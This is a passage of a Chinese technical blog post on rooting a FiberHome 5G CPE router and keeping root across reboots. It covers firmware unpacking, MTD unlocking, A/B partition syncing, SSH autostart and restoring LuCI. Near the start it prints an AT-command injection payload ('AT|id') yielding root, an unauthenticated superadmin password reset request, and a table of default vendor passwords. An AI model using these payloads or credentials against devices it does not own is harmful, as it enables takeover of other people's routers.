+</span></span><span class=line><span class=cl><span class=c1># 4. AT 命令注入，执行任意命令</span>
+</span></span><span class=line><span class=cl>POST /api/tmp/FHAPIS  <span class=nv>ajaxmethod</span><span class=o>=</span>set_at_command
+</span></span><span class=line><span class=cl><span class=o>{</span><span class=s1>&#39;command&#39;</span>: <span class=s1>&#39;AT|id&#39;</span><span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=c1># → {&#34;at_result&#34;: &#34;uid=0(root) gid=0(root)\n&#34;}</span>
+</span></span></code></pre></div><p>也就是说，任何能连上设备网络的人，4 个请求就能拿到 root RCE。甚至不需要读取密码，直接重置也行：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>POST /api/tmp/FHNCAPIS  <span class=nv>ajaxmethod</span><span class=o>=</span>set_value_by_xmlnode
+</span></span><span class=line><span class=cl><span class=o>{</span><span class=s1>&#39;InternetGatewayDevice.X_FH_WebUserInfo.2.WebSuperPassword&#39;</span>: <span class=s1>&#39;mypassword&#39;</span><span class=o>}</span>
+</span></span></code></pre></div><p>这个漏洞是 <code>FHNCAPIS</code> 端点设计时就没有加认证，而 AES 加密的密钥又是公开可获取的，权限管理形同虚设。</p><p>到这里我们已经能通过多种方式临时获取 root shell 了，不过这些都是一次性的，重启之后 dropbear 进程和防火墙规则都会丢失。接下来想办法实现持久化。</p><h2 id=自启动方式排查>自启动方式排查</h2><p>第一反应是找一个可写的地方塞个启动脚本，但系统性排查后发现，几乎全部行不通：</p><table><thead><tr><th>方式</th><th>原因</th></tr></thead><tbody><tr><td>SshEnable 参数</td><td>死参数，无进程消费</td></tr><tr><td>process_start_list</td><td>路径硬编码为 <code>/fhrom/fhconf/</code>，只读</td></tr><tr><td>nginx.conf 注入</td><td>每次启动被 start_webserver.sh 覆盖</td></tr><tr><td>crond 定时任务</td><td>crontab 目录为空且不可写入</td></tr><tr><td>init 脚本</td><td>全在 squashfs 只读分区</td></tr><tr><td>hotplug 脚本</td><td>依赖项都在只读目录</td></tr><tr><td>rc.local（无 overlay）</td><td><code>/etc</code> 只读，无法写入</td></tr><tr><td>uci-defaults</td><td>目录在 squashfs，无法添加脚本</td></tr><tr><td>UCI triggers</td><td>只在 <code>uci commit</code> 时触发，启动时不触发</td></tr><tr><td>PATH 劫持</td><td>PATH 中所有目录都在 squashfs</td></tr><tr><td>preinit 脚本链</td><td>16 个脚本全在只读分区</td></tr><tr><td>定时重启功能注入</td><td>纯整数比较，无法注入</td></tr></tbody></table><p>核心问题在于：根文件系统是 squashfs 只读的，几乎所有启动脚本和配置路径都在只读分区上。唯一的出路是激活 OpenWrt 的 overlayfs 机制，让 <code>/etc</code> 变成可写的。但这需要修改固件，先来深入了解一下系统结构。</p><h2 id=深入系统>深入系统</h2><h3 id=密码体系>密码体系</h3><p>设备有好几层密码，规则各不相同：</p><table><thead><tr><th>用途</th><th>默认密码</th><th>说明</th></tr></thead><tbody><tr><td>Web admin</td><td>写在设备底部铭牌上</td><td></td></tr><tr><td>Web superadmin</td><td><code>F1ber$dm​</code></td><td>RP0107+ 版本</td></tr><tr><td>Telnet admin</td><td><code>hg2x0</code> + MAC 后 6 位</td><td>例如 <code>hg2x0D4E5F6</code></td></tr><tr><td>su root</td><td><code>f1ber@dm!n</code> + MAC 后 6 位</td><td>MD5 crypt 验证</td></tr><tr><td>/etc/shadow root</td><td><code>F1ber@dm!n</code></td><td>SHA-512 hash，musl 不支持，<strong>SSH 无法使用</strong></td></tr><tr><td>FTP</td><td><code>admin</code> / <code>f1ber@dm!n</code></td><td>工厂模式可用</td></tr></tbody></table><h3 id=ab-双分区机制>A/B 双分区机制</h3><p>设备采用了 A/B 分区设计，用于安全 OTA 升级：写入新固件到非活动槽位，切换后启动，无法启动时自动回退到旧槽位。</p><p>Bootctrl 数据位于 misc 分区（mtd3）偏移 0x800 处，共 16 字节：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>偏移  内容
+</span></span><span class=line><span class=cl>+0    magic: 0x00414230 (&#34;AB0&#34;)
+</span></span><span class=line><span class=cl>+4    padding: 0xFFFFFFFF
+</span></span><span class=line><span class=cl>+8    priority_a (高值优先启动)
+</span></span><span class=line><span class=cl>+9    try_a (重试计数)
+</span></span><span class=line><span class=cl>+10   success_a (0x01 = 确认成功)
+</span></span><span class=line><span class=cl>+11   up_a (升级类型)
+</span></span><span class=line><span class=cl>+12~15  priority_b, try_b, success_b, up_b
+</span></span></code></pre></div><p>Bootloader 选择 priority 值更高的槽位启动。</p><h3 id=分区表>分区表</h3><p>设备的 NAND Flash 划分了大量分区，A/B 槽位各有一份完整的系统分区：</p><table><thead><tr><th>分区</th><th>Slot A MTD</th><th>Slot B MTD</th><th>大小</th><th>说明</th></tr></thead><tbody><tr><td>lk (bootloader)</td><td>25</td><td>38</td><td>2 MB</td><td>Little Kernel</td></tr><tr><td>boot (内核)</td><td>27</td><td>40</td><td>32 MB</td><td>Linux 内核</td></tr><tr><td>rootfs_sig</td><td>28</td><td>41</td><td>1 MB</td><td>固件签名</td></tr><tr><td>rootfs</td><td>29</td><td>42</td><td>64 MB</td><td>根文件系统</td></tr><tr><td>md1img (5G 固件)</td><td>17</td><td>30</td><td>80 MB</td><td>5G modem 固件</td></tr><tr><td>md1dsp</td><td>18</td><td>31</td><td>10 MB</td><td>5G DSP</td></tr></tbody></table><p>共享分区（不分 A/B）：</p><table><thead><tr><th>分区</th><th>MTD</th><th>大小</th><th>说明</th></tr></thead><tbody><tr><td>misc</td><td>3</td><td>1 MB</td><td>bootctrl 数据</td></tr><tr><td>user_data</td><td>48</td><td>441 MB</td><td>用户数据 /data</td></tr></tbody></table><h3 id=文件系统布局>文件系统布局</h3><table><thead><tr><th>挂载点</th><th>类型</th><th>权限</th><th>用途</th></tr></thead><tbody><tr><td><code>/</code></td><td>squashfs</td><td>只读</td><td>根文件系统</td></tr><tr><td><code>/tmp</code></td><td>tmpfs</td><td>读写</td><td>临时文件，重启清空</td></tr><tr><td><code>/data</code></td><td>ubifs</td><td>读写</td><td>持久用户数据</td></tr><tr><td><code>/fhdata</code></td><td>ubifs</td><td>只读</td><td>出厂配置</td></tr><tr><td><code>/customer</code></td><td>ubifs</td><td>读写</td><td>UCI 配置文件</td></tr><tr><td><code>/fhrom</code></td><td>squashfs</td><td>只读</td><td>烽火自定义二进制文件</td></tr></tbody></table><p>关键信息：根文件系统是 squashfs 只读的，<code>/etc</code> 下的文件不能直接修改。可写的位置只有 <code>/tmp</code>（重启丢失）、<code>/data</code>（持久）和 <code>/customer</code>，要实现 SSH 服务自启动，必须修改固件激活 overlayfs。</p><h2 id=解锁与固件修改>解锁与固件修改</h2><p><strong>提醒：以下操作存在风险，可能导致设备变砖，请务必做好备份，并确保有物理访问权限以便恢复。</strong></p><h3 id=mtd-写保护解锁>MTD 写保护解锁</h3><p>烽火在驱动层面加了写保护，直接写 NAND 分区会被内核拒绝，在网页端，有个本地升级功能，通过逆向 <code>webs</code> 的固件升级流程，追踪到了解锁的调用链：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>webs (do_version_up)
+</span></span><span class=line><span class=cl>  → libLedState.so (bsp_write_handler)
+</span></span><span class=line><span class=cl>    → libfhdrv_kdrv_board.so (fhdrv_kdrv_update_flash_opt)
+</span></span><span class=line><span class=cl>      → ioctl(fd, 0x40085318, {mtd_num, 0})  // 解锁
+</span></span></code></pre></div><p>烽火通过 <code>/dev/fhdrv_kdrv_board</code> 字符设备（主设备号 506）的自定义 ioctl 来控制 MTD 写保护。写了一个小工具来调用它：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/ioctl.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=cp>#define DEVICE_PATH &#34;/dev/fhdrv_kdrv_board&#34;
+</span></span></span><span class=line><span class=cl><span class=cp>#define IOCTL_FLASH_SET 0x40085318
+</span></span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>flash_opt</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>mtd_num</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>lock_flag</span><span class=p>;</span>  <span class=cm>/* 0 = unlock, 1 = lock */</span>
+</span></span><span class=line><span class=cl><span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Usage: %s &lt;mtd_num&gt; [lock]</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;  %s 29       - unlock mtd29</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;  %s 29 lock  - lock mtd29</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>mtd_num</span> <span class=o>=</span> <span class=nf>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>lock_flag</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>  <span class=cm>/* default: unlock */</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&gt;=</span> <span class=mi>3</span> <span class=o>&amp;&amp;</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=s>&#34;lock&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>lock_flag</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>DEVICE_PATH</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>fd</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;open &#34;</span> <span class=n>DEVICE_PATH</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>flash_opt</span> <span class=n>opt</span> <span class=o>=</span> <span class=p>{</span> <span class=n>mtd_num</span><span class=p>,</span> <span class=n>lock_flag</span> <span class=p>};</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>ret</span> <span class=o>=</span> <span class=nf>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>IOCTL_FLASH_SET</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>opt</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>ret</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;ioctl FLASH_SET&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;mtd%d %s OK</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>mtd_num</span><span class=p>,</span> <span class=n>lock_flag</span> <span class=o>?</span> <span class=s>&#34;locked&#34;</span> <span class=o>:</span> <span class=s>&#34;unlocked&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></div><p>交叉编译后传到设备上：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>aarch64-linux-musl-gcc -static -o mtd_unlock mtd_unlock.c
+</span></span><span class=line><span class=cl>scp mtd_unlock root@192.168.8.1:/data/
+</span></span></code></pre></div><p>使用方式：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>/data/mtd_unlock <span class=m>29</span>         <span class=c1># 解锁 rootfs_a</span>
+</span></span><span class=line><span class=cl>/data/mtd_unlock <span class=m>29</span> lock    <span class=c1># 重新锁定</span>
+</span></span></code></pre></div><h3 id=固件修改实战>固件修改实战</h3><p>目标是让设备启动时自动激活 overlayfs，这样 <code>/etc</code> 就变成可写的了，改了什么东西都能持久保存。</p><p>OpenWrt 本身有完整的 overlay 机制，但烽火在 <code>/lib/preinit/80_mount_root</code> 中把 <code>mount_root</code> 调用注释掉了：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=cp>#!/bin/sh
+</span></span></span><span class=line><span class=cl><span class=c1># Copyright (C) 2006 OpenWrt.org</span>
+</span></span><span class=line><span class=cl><span class=c1># Copyright (C) 2010 Vertical Communications</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>do_mount_root<span class=o>()</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=c1>#mount_root        # ← 烽火注释了这一行</span>
+</span></span><span class=line><span class=cl>        boot_run_hook preinit_mount_root
+</span></span><span class=line><span class=cl>        <span class=o>[</span> -f /sysupgrade.tgz <span class=o>]</span> <span class=o>&amp;&amp;</span> <span class=o>{</span>
+</span></span><span class=line><span class=cl>                <span class=nb>echo</span> <span class=s2>&#34;- config restore -&#34;</span>
+</span></span><span class=line><span class=cl>                <span class=nb>cd</span> /
+</span></span><span class=line><span class=cl>                tar xzf /sysupgrade.tgz
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$INITRAMFS</span><span class=s2>&#34;</span> <span class=o>=</span> <span class=s2>&#34;1&#34;</span> <span class=o>]</span> <span class=o>||</span> boot_hook_add preinit_main do_mount_root
+</span></span></code></pre></div><p>只需要把注释去掉，overlay 就能工作了。完整流程：</p><p><strong>第一步：导出当前 rootfs</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># 在 CPE 设备上</span>
+</span></span><span class=line><span class=cl>nanddump --skip-bad-blocks-to-start /dev/mtd/rootfs -f /data/rootfs_dump.squashfs
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 传到电脑</span>
+</span></span><span class=line><span class=cl>scp root@192.168.8.1:/data/rootfs_dump.squashfs ./
+</span></span></code></pre></div><p><strong>第二步：解包、修改、重打包</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># 提取 UBI 镜像中的 squashfs</span>
+</span></span><span class=line><span class=cl>ubireader_extract_images rootfs_dump.squashfs -o ubi_extract/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 解压 squashfs</span>
+</span></span><span class=line><span class=cl>unsquashfs -f -d squashfs-root ubi_extract/rootfs_dump.squashfs/img-*_vol-rootfs.ubifs
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 关键修改：去掉 mount_root 前的注释符</span>
+</span></span><span class=line><span class=cl><span class=c1># 编辑 squashfs-root/lib/preinit/80_mount_root</span>
+</span></span><span class=line><span class=cl><span class=c1># 将 &#34;#mount_root&#34; 改为 &#34;mount_root&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 重新打包（参数必须和原始一致）</span>
+</span></span><span class=line><span class=cl>mksquashfs squashfs-root rootfs_modified.squashfs <span class=se>\
+</span></span></span><span class=line><span class=cl>    -comp xz -b <span class=m>262144</span> -no-xattrs -noappend -all-root
+</span></span></code></pre></div><p><strong>第三步：同步 A/B 分区</strong></p><p>写 rootfs 之前，务必先把当前活动槽位的所有分区同步到目标槽位，否则内核/modem 版本不匹配会导致 5G 异常：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># 示例：将 slot B 同步到 slot A</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> pair in <span class=se>\
+</span></span></span><span class=line><span class=cl>    <span class=s2>&#34;27 40 boot&#34;</span> <span class=s2>&#34;25 38 lk&#34;</span> <span class=s2>&#34;17 30 md1img&#34;</span> <span class=s2>&#34;18 31 md1dsp&#34;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>    <span class=s2>&#34;28 41 rootfs_sig&#34;</span> <span class=s2>&#34;19 32 spmfw&#34;</span> <span class=s2>&#34;20 33 pi_img&#34;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>    <span class=s2>&#34;21 34 dpm&#34;</span> <span class=s2>&#34;22 35 medmcu&#34;</span> <span class=s2>&#34;23 36 sspm&#34;</span> <span class=s2>&#34;24 37 mcupm&#34;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>    <span class=s2>&#34;26 39 tee&#34;</span> <span class=s2>&#34;10 12 mcf1&#34;</span> <span class=s2>&#34;11 13 mcf2&#34;</span> <span class=s2>&#34;43 44 loader_ext&#34;</span><span class=p>;</span> <span class=k>do</span>
+</span></span><span class=line><span class=cl>    <span class=nb>set</span> -- <span class=nv>$pair</span><span class=p>;</span> <span class=nv>DST</span><span class=o>=</span><span class=nv>$1</span><span class=p>;</span> <span class=nv>SRC</span><span class=o>=</span><span class=nv>$2</span><span class=p>;</span> <span class=nv>NAME</span><span class=o>=</span><span class=nv>$3</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;=== </span><span class=nv>$NAME</span><span class=s2>: mtd</span><span class=nv>$SRC</span><span class=s2> → mtd</span><span class=nv>$DST</span><span class=s2> ===&#34;</span>
+</span></span><span class=line><span class=cl>    nanddump --skip-bad-blocks-to-start /dev/mtd<span class=nv>$SRC</span> -f /tmp/part.bin 2&gt;/dev/null
+</span></span><span class=line><span class=cl>    /data/mtd_unlock <span class=nv>$DST</span>
+</span></span><span class=line><span class=cl>    flash_erase /dev/mtd<span class=nv>$DST</span> <span class=m>0</span> <span class=m>0</span>
+</span></span><span class=line><span class=cl>    nandwrite -p /dev/mtd<span class=nv>$DST</span> /tmp/part.bin
+</span></span><span class=line><span class=cl>    /data/mtd_unlock <span class=nv>$DST</span> lock
+</span></span><span class=line><span class=cl>    rm /tmp/part.bin
+</span></span><span class=line><span class=cl><span class=k>done</span>
+</span></span></code></pre></div><p><strong>第四步：写入修改后的 rootfs</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>scp rootfs_modified.squashfs root@192.168.8.1:/tmp/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 在 CPE 设备上</span>
+</span></span><span class=line><span class=cl>/data/mtd_unlock <span class=m>29</span>                              <span class=c1># 解锁 rootfs_a</span>
+</span></span><span class=line><span class=cl>ubiattach -p /dev/mtd29 -d <span class=m>2</span>                    <span class=c1># 挂载为 ubi2</span>
+</span></span></code></pre></div><p>写入前先检查卷大小是否够用。不同固件版本的 rootfs UBI 卷大小可能不同（如 153 LEBs vs 154 LEBs），如果新的 squashfs 比卷大，需要先调整：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># 查看当前卷大小</span>
+</span></span><span class=line><span class=cl>ubinfo /dev/ubi2_0
+</span></span><span class=line><span class=cl><span class=c1># 输出中关注 &#34;Size&#34; 字段，例如 &#34;Size: 153 LEBs (xxxxx bytes)&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 查看新 squashfs 大小</span>
+</span></span><span class=line><span class=cl>ls -l /tmp/rootfs_modified.squashfs
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 如果卷空间不够，缩小 rootfs_data（卷 1）腾出空间给 rootfs（卷 0）</span>
+</span></span><span class=line><span class=cl><span class=c1># UBI 总空间 = rootfs + rootfs_data，两个卷共享同一个 UBI 设备</span>
+</span></span><span class=line><span class=cl><span class=c1># 例如需要将 rootfs 从 153 LEBs 扩到 155 LEBs：</span>
+</span></span><span class=line><span class=cl>ubirsvol /dev/ubi2 -n <span class=m>1</span> -s 18MiB    <span class=c1># 先缩小 rootfs_data</span>
+</span></span><span class=line><span class=cl>ubirsvol /dev/ubi2 -n <span class=m>0</span> -s 40MiB    <span class=c1># 再扩大 rootfs</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 写入</span>
+</span></span><span class=line><span class=cl>ubiupdatevol /dev/ubi2_0 /tmp/rootfs_modified.squashfs
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 断开并锁定</span>
+</span></span><span class=line><span class=cl>ubidetach -d <span class=m>2</span>
+</span></span><span class=line><span class=cl>/data/mtd_unlock <span class=m>29</span> lock
+</span></span></code></pre></div><p><strong>第五步：切换启动槽位并重启</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>. /lib/functions.sh<span class=p>;</span> . /lib/functions/system.sh<span class=p>;</span> include /lib/upgrade
+</span></span><span class=line><span class=cl><span class=nv>FLASH_TYPE</span><span class=o>=</span><span class=k>$(</span>get_flash_type<span class=k>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/data/mtd_unlock <span class=m>3</span>
+</span></span><span class=line><span class=cl><span class=c1># 设置 A 槽优先级高于 B 槽</span>
+</span></span><span class=line><span class=cl>set_bootctrl_string <span class=m>1</span> 0f <span class=m>0</span> <span class=m>00</span> <span class=m>1</span> <span class=m>01</span> <span class=m>0</span> <span class=m>00</span> <span class=m>1</span> 0e <span class=m>0</span> <span class=m>00</span> <span class=m>1</span> <span class=m>01</span> <span class=m>0</span> <span class=m>00</span>
+</span></span><span class=line><span class=cl>/data/mtd_unlock <span class=m>3</span> lock
+</span></span><span class=line><span class=cl>reboot
+</span></span></code></pre></div><p><strong>当前状态：</strong></p><ul><li>Slot A：修改后的固件（overlay 激活，SSH 自启动）← 日常使用</li><li>Slot B：原始固件 ← 紧急回退</li></ul><h3 id=服务自启动>服务自启动</h3><p>Overlay 激活后 <code>/etc</code> 变成可写，现在可以配置 SSH 自启动了。首次启动修改后的固件时，SSH 还没有自启动，需要先用前面的方法临时开启，脚本已经在 <code>/data/ssh_enable.sh</code>（重启不丢失），随便用哪种方式执行一次就行：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># 例如通过 AT 注入</span>
+</span></span><span class=line><span class=cl>POST /api/tmp/FHAPIS  <span class=nv>ajaxmethod</span><span class=o>=</span>set_at_command
+</span></span><span class=line><span class=cl><span class=o>{</span><span class=s1>&#39;command&#39;</span>: <span class=s1>&#39;AT|sh /data/ssh_enable.sh&#39;</span><span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 或者通过 ADB</span>
+</span></span><span class=line><span class=cl>adb shell <span class=s2>&#34;sh /data/ssh_enable.sh&#34;</span>
+</span></span></code></pre></div><p>SSH 登录后（密码 root123），配置永久自启动：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># 1. 设置永久 root 密码（overlay 下 /etc/shadow 可写了）</span>
+</span></span><span class=line><span class=cl>umount /etc/shadow 2&gt;/dev/null   <span class=c1># 先解除 ssh_enable.sh 的 bind mount</span>
+</span></span><span class=line><span class=cl>passwd root
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 2. 启用 dropbear 自启动</span>
+</span></span><span class=line><span class=cl>/etc/init.d/dropbear <span class=nb>enable</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 3. 配置防火墙持久化</span>
+</span></span><span class=line><span class=cl>cat &gt; /etc/rc.local <span class=s>&lt;&lt; &#39;EOF&#39;
+</span></span></span><span class=line><span class=cl><span class=s>iptables -C INPUT -p tcp --dport 22 -j ACCEPT 2&gt;/dev/null || \
+</span></span></span><span class=line><span class=cl><span class=s>    iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT
+</span></span></span><span class=line><span class=cl><span class=s>exit 0
+</span></span></span><span class=line><span class=cl><span class=s>EOF</span>
+</span></span></code></pre></div><p>重启验证：SSH 应自动可用，无需再执行脚本。</p><p>还有一个小坑：原始的 <code>S99zmtk_boot_done</code> 脚本在更新 bootctrl 时没有先解锁 MTD，导致写入静默失败。需要在 overlay 里打个补丁，在 <code>set_bootctrl_string</code> 前后加上 <code>/data/mtd_unlock 3</code> 和 <code>/data/mtd_unlock 3 lock</code>。</p><h3 id=启用-luci-web-界面>启用 LuCI Web 界面</h3><p><div class=fancybox><a data-fancybox=gallery href=https://static.codming.com/img/20260413174656285.png><img src=https://static.codming.com/img/20260413174656285.png alt="LuCI Web 界面" loading=lazy></a><div class=image-caption>LuCI Web 界面</div></div></p><p>设备固件基于 OpenWrt 19.07.7，LuCI 框架及依赖已预装在 squashfs 中，但烽火移除了 uhttpd 二进制。补回 uhttpd 后可以在独立端口运行 LuCI，和原厂 Web 界面并行使用。</p><table><thead><tr><th>组件</th><th>状态</th></tr></thead><tbody><tr><td>LuCI 框架 <code>/usr/lib/lua/luci/</code></td><td>✅ 已预装</td></tr><tr><td>LuCI CGI 入口 <code>/www/cgi-bin/luci</code></td><td>✅ 已存在</td></tr><tr><td>rpcd <code>/sbin/rpcd</code></td><td>✅ 已运行</td></tr><tr><td>uhttpd 配置和 init 脚本</td><td>✅ 已存在</td></tr><tr><td><strong>uhttpd 二进制</strong> <code>/usr/sbin/uhttpd</code></td><td>❌ 被移除</td></tr><tr><td><strong>uhttpd_lua.so</strong></td><td>❌ 被移除</td></tr><tr><td><strong>uhttpd_ubus.so</strong></td><td>❌ 被移除</td></tr></tbody></table><p>只需补回三个被移除的文件即可。设备上的 opkg 已损坏（Segfault），需要在电脑上下载 ipk 包手动解包：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># 在电脑上下载三个包（aarch64_cortex-a53 与设备的 a55 二进制兼容）</span>
+</span></span><span class=line><span class=cl>curl -L -O https://downloads.openwrt.org/releases/19.07.7/packages/aarch64_cortex-a53/base/uhttpd_2020-10-01-3abcc891-1_aarch64_cortex-a53.ipk
+</span></span><span class=line><span class=cl>curl -L -O https://downloads.openwrt.org/releases/19.07.7/packages/aarch64_cortex-a53/base/uhttpd-mod-lua_2020-10-01-3abcc891-1_aarch64_cortex-a53.ipk
